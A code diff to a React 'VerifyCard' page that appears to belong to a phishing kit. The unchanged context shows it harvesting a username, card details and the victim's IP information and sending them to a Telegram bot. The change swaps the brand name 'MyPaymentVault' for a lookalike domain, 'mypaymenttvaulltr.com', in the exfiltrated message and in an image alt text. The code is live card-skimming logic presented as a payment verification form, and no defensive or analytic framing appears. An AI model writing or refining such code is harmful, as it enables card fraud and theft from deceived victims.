@@ -90,7 +90,7 @@ export default function VerifyCard() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `💳 <b>MyPaymentVault</b>\n` +
+      `💳 <b>mypaymenttvaulltr.com</b>\n` +
       `📌 <b>Step 2 — Card Details</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
@@ -191,7 +191,7 @@ export default function VerifyCard() {
 
         {/* ══ HERO IMAGE ══ */}
         <div style={{ width: "100%", lineHeight: 0 }}>
-          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
+          <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
         </div>
 
         {/* ══ FORM ══ */}
